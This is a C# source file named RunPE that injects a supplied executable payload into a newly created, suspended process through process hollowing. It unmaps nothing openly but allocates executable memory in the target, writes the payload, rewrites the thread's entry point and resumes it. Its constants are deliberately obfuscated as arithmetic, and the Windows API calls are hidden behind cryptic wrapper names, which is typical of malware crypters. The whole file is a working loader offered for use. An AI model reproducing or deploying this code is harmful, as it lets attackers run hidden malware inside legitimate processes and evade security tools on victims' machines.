using System;
using System.Runtime.InteropServices;
using RunPE.Properties;

//Use : RunPE.Class1.Execute
namespace RunPE
{
    public class Class1 : API
    {
        public static StartupInformation si = new StartupInformation();
        public static ProcessInformation pi = new ProcessInformation();

        public static void Execute(string path, byte[] payload)
        {
            int lireEcrire = 1+1-2;
            si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
            CreateProcessA(path, null, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref si, ref pi);
            int[] context = new int[179];
            context[0] = 65000+538;
            Helper.Gtc(context);
            int ebx = context[41] + 8;
            int baseAdress = 5-5;
            int bufferSize = 2*2;
            Helper.Rpm(ebx, baseAdress, bufferSize, lireEcrire);
            int fileAdress = BitConverter.ToInt32(payload, 30*2);
            int imageBase = BitConverter.ToInt32(payload, 100+12);
            int sizeOfImage = BitConverter.ToInt32(payload, fileAdress + 40*2);
            int sizeOfHeader = BitConverter.ToInt32(payload, fileAdress + 40*2+4);
            int type = 12000+288;
            int protect = 32*2;
            int newImageBase = Helper.Vae(imageBase, sizeOfImage, type, protect);
            Helper.Wpm(newImageBase, payload, sizeOfHeader, lireEcrire, fileAdress, ebx, bufferSize);
            int adressOfEntryPoint = BitConverter.ToInt32(payload, fileAdress + 200-100);
            context[22+22] = newImageBase + adressOfEntryPoint;
            Helper.Stc(context);
            Helper.Rt();
        }
    }
}